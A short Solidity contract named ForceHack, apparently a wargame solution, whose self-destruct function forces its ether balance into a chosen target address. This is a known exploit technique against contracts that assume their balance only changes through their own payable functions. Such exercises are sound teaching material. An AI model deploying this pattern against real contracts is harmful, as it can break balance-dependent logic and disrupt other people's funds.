// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceHack {
    constructor() payable {}
    function destruct(address payable forceAddress) public {
        selfdestruct(forceAddress);
    }
}
